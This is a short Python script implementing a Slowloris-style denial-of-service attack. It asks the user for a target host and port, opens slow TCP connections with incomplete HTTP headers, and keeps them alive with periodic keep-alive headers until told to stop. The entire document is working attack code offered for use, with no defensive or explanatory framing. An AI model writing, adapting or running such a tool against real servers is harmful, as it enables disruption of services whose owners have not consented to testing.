import socket
import time

GREEN = "\033[92m"
RESET = "\033[0m"

host = input("Enter the target IP or hostname: ").strip()
port_input = input("Enter the target port: ").strip()

try:
    port = int(port_input)
except ValueError:
    print(GREEN + "Invalid port number. Using default port 2025." + RESET)
    port = 2025

def slowloris_connection(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(b"GET / HTTP/1.1\r\n")
    s.send(b"Host: %b\r\n" % host.encode())
    return s

sockets = [slowloris_connection(host, port) for _ in range(2)]
print(GREEN + f"2 slow connections established to {host}:{port}. Type 'end' to terminate." + RESET)

while True:
    for s in sockets:
        try:
            s.send(b"X-a: keep-alive\r\n")
        except:
            sockets.remove(s)
    time.sleep(10)
    command = input().strip().lower()
    if command == "end":
        print(GREEN + "Closing sockets..." + RESET)
        for s in sockets:
            s.close()
        break